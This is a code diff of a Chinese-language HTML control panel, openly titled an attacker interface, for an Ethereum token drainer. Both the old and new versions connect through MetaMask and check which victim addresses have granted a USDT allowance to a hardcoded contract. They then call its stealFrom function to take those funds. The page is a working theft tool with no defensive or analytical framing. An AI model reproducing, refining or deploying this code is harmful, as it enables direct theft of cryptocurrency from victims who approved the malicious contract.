@@ -1,75 +1,68 @@
+
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>盜取控制台 v3.1</title>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<head>
+  <meta charset="UTF-8">
+  <title>🛠️ 攻擊者操作介面 v3.1.1</title>
 </head>
-<body style="font-family:monospace;padding:30px;">
-  <h2>🛠️ 攻擊者操作介面 <span style="float:right;color:gray;">v3.1</span></h2>
-  <div>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></div>
-  <div id="status">⏳ 讀取中...</div><br>
-  <input id="victim" placeholder="受害者地址" style="width:380px;">
-  <button onclick="steal()">執行盜取</button>
-  <pre id="log">⚙️ 等待操作…</pre>
-  <h3>📌 最近授權地址列表：</h3>
+<body>
+  <h2>🛠️ 攻擊者操作介面 v3.1.1（Ethereum 主網）</h2>
+  <p>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></p>
+  <p>目前登入帳號：<span id="account">未連線</span></p>
+  <p>✅ 身份驗證：你是攻擊者本人</p>
+  <input id="victim" placeholder="受害者地址">
+  <button onclick="drain()">執行盜取</button>
+  <p>⛏️ 等待操作...</p>
+  <h4>📜 最近授權地址列表：</h4>
   <ul id="list"></ul>
-  <script>
-    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const contractAddr = "0xFbe9c4748A267562f723C67db673943F901533D6";
-    const abi = [{"name":"stealFrom","type":"function","inputs":[{"name":"victim","type":"address"}],"outputs":[],"stateMutability":"nonpayable"}];
-    const usdtABI = [{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-                     {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
 
-    let current;
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script>
+    const contractAddress = "0xFbe9c4748A267562f723C67db673943F901533D6";
+    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const abi = [{ "name": "stealFrom", "type": "function", "inputs": [
+      { "type": "address", "name": "victim" }
+    ], "outputs": [], "constant": false }];
+    const erc20abi = [
+      { "name": "allowance", "type": "function", "inputs": [
+        { "type": "address", "name": "owner" },
+        { "type": "address", "name": "spender" }
+      ], "outputs": [{ "type": "uint256", "name": "" }], "constant": true },
+    ];
 
     async function load() {
-      if (!window.ethereum) return alert("請先安裝 MetaMask");
       const web3 = new Web3(window.ethereum);
-      await ethereum.request({ method: 'eth_requestAccounts' });
+      await window.ethereum.enable();
       const accounts = await web3.eth.getAccounts();
-      current = accounts[0];
-      const status = document.getElementById("status");
-      if (current.toLowerCase() === attacker.toLowerCase()) {
-        status.innerHTML = `👤 目前登入帳號：<b style='color:green;'>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b><br>✅ 身份驗證：你是攻擊者本人`;
-      } else {
-        status.innerHTML = `👤 目前登入帳號：<b style='color:red;'>${current}</b><br>❌ 非攻擊者帳號，請切換`;
+      document.getElementById("account").innerText = accounts[0];
+
+      const history = JSON.parse(localStorage.getItem("history") || "[]");
+      const list = document.getElementById("list");
+      const erc20 = new web3.eth.Contract(erc20abi, tokenAddress);
+      for (const addr of history) {
+        const allowance = await erc20.methods.allowance(addr, contractAddress).call();
+        if (allowance > 0) {
+          const li = document.createElement("li");
+          li.innerText = addr;
+          list.appendChild(li);
+        }
       }
-      renderList();
     }
 
-    function renderList() {
-      const ul = document.getElementById("list");
-      const data = JSON.parse(localStorage.getItem("victims") || "[]");
-      ul.innerHTML = "";
-      data.forEach((v, i) => {
-        const li = document.createElement("li");
-        li.textContent = `${i + 1}. ${v.address} 🕒 ${v.time}`;
-        ul.appendChild(li);
-      });
-    }
-
-    async function steal() {
+    async function drain() {
       const web3 = new Web3(window.ethereum);
+      const contract = new web3.eth.Contract(abi, contractAddress);
+      const accounts = await web3.eth.getAccounts();
       const victim = document.getElementById("victim").value;
-      const log = document.getElementById("log");
-      if (!victim) return log.innerText = "❌ 請輸入受害者地址";
-      const usdt = new web3.eth.Contract(usdtABI, token);
-      const balance = await usdt.methods.balanceOf(victim).call();
-      const allowance = await usdt.methods.allowance(victim, contractAddr).call();
-      const min = Math.min(balance, allowance);
-      log.innerText = `🧾 受害者：${victim}\n💰 Balance：${balance}\n🔐 Allowance：${allowance}`;
-      if (String(min) === "0") return log.innerText += "\n❌ 餘額或授權額度為 0";
-      const contract = new web3.eth.Contract(abi, contractAddr);
-      log.innerText += `\n🚀 呼叫 stealFrom(${victim})...`;
       try {
-        const tx = await contract.methods.stealFrom(victim).send({from: current});
-        log.innerText += `\n✅ 成功！TX Hash: https://etherscan.io/tx/${tx.transactionHash}`;
+        await contract.methods.stealFrom(victim).send({ from: accounts[0] });
+        alert("✅ 執行成功");
       } catch (e) {
-        log.innerText += `\n❌ MetaMask 拒絕或錯誤：` + (e.message || e);
+        alert("❌ 錯誤：" + e.message);
       }
     }
 
-    window.onload = load;
+    load();
   </script>
 </body>
 </html>
